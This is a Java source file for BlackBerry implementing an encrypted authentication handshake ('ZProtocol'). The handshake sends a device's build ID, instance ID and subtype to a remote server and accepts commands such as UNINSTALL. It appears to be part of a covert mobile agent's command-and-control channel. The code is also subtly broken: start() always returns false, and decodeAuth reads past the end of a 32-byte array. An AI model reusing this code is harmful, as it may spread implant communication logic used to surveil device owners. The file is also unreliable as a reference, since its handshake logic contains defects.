//#preprocess
package blackberry.action.sync.protocol;

import net.rim.device.api.crypto.RandomSource;
import net.rim.device.api.crypto.SHA1Digest;
import net.rim.device.api.util.DataBuffer;
import blackberry.Device;
import blackberry.action.sync.Protocol;
import blackberry.action.sync.transport.TransportException;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.transfer.Proto;
import blackberry.transfer.ProtocolException;
import blackberry.utils.Check;
import blackberry.utils.Utils;

public class ZProtocol extends Protocol {

    //#ifdef DEBUG
    private static Debug debug = new Debug("ZProtocol", DebugLevel.VERBOSE);
    //#endif

    private final Encryption crypto = new Encryption();

    byte[] Kd = new byte[16];
    byte[] Nonce = new byte[16];

    public boolean start() throws ProtocolException {

        crypto.makeKey(Keys.getInstance().getChallengeKey());
        RandomSource.getBytes(Kd);
        RandomSource.getBytes(Nonce);

        //#ifdef DEBUG
        debug.trace("Kd: " + Utils.byteArrayToHex(Kd));
        debug.trace("Nonce: " + Utils.byteArrayToHex(Nonce));
        //#endif

        try {
            byte[] authResult = cypherCommand(forgeAuthentication());
            decodeAuth(authResult);

        } catch (TransportException e) {
            return false;
        }
        return false;
    }

    private byte[] forgeAuthentication() {
        Keys keys = Keys.getInstance();

        byte[] data = new byte[104];
        DataBuffer dataBuffer = new DataBuffer(data, 0, 104, false);

        // filling structure
        dataBuffer.write(Kd);
        dataBuffer.write(Nonce);

        dataBuffer.write(keys.getBuildId());
        dataBuffer.write(keys.getInstanceId());
        dataBuffer.write(Device.getSubtype());

        // calculating digest
        final SHA1Digest digest = new SHA1Digest();
        digest.update(keys.getBuildId());
        digest.update(keys.getInstanceId());
        digest.update(Device.getSubtype());
        digest.update(keys.getAesKey());

        byte[] sha1 = digest.getDigest();

        // appending digest
        dataBuffer.write(sha1);

        //#ifdef DBC
        Check.ensures(dataBuffer.getPosition() == data.length,
                "forgeAuthentication, wrong array size");
        //#endif

        //#ifdef DEBUG
        debug.trace("forgeAuthentication: " + Utils.byteArrayToHex(data));
        //#endif
        return data;
    }

    private void decodeAuth(byte[] authResult) throws ProtocolException {
        //#ifdef DBC
        Check.ensures(authResult.length == 48, "authResult.length="
                + authResult.length);
        //#endif

        // Retrieve K
        byte[] cypherKs = new byte[16];
        Utils.copy(cypherKs, authResult, cypherKs.length);
        byte[] Ks = crypto.decryptData(cypherKs);

        final SHA1Digest digest = new SHA1Digest();
        digest.update(Ks);
        digest.update(Kd);
        digest.update(Keys.getInstance().getAesKey());

        byte[] K = new byte[16];
        Utils.copy(K, digest.getDigest(), K.length);

        crypto.makeKey(K);

        //#ifdef DEBUG
        debug.trace("decodeAuth K=" + Utils.byteArrayToHex(K));
        //#endif

        // Retrieve Nonce and Cap
        byte[] cypherNonceCap = new byte[32];
        Utils.copy(cypherNonceCap, 0, authResult, 16, cypherNonceCap.length);

        byte[] plainNonceCap = crypto.decryptData(cypherNonceCap);
        //#ifdef DEBUG
        debug.trace("decodeAuth plainNonceCap="
                + Utils.byteArrayToHex(plainNonceCap));
        //#endif
        
        boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0, Nonce.length);
        //#ifdef DEBUG
        debug.trace("decodeAuth nonceOK: " + nonceOK);
        //#endif
        if(nonceOK){
            int cap = Utils.byteArrayToInt(plainNonceCap, 32);
            if(cap == Proto.OK){
                //#ifdef DEBUG
                debug.trace("decodeAuth Proto OK");
                //#endif
            }else if (cap == Proto.UNINSTALL) {
                //#ifdef DEBUG
                debug.trace("decodeAuth Proto Uninstall");
                //#endif
            }else{
                //#ifdef DEBUG
                debug.trace("decodeAuth error: " + cap);
                //#endif
                throw new ProtocolException();
            }
        }else{
            throw new ProtocolException();
        }

    }

    private byte[] cypherCommand(byte[] data) throws TransportException {
        byte[] cypherOut = crypto.encryptData(data);
        byte[] cypherIn = transport.command(cypherOut);
        byte[] plainIn = crypto.decryptData(cypherIn);
        return plainIn;
    }
}
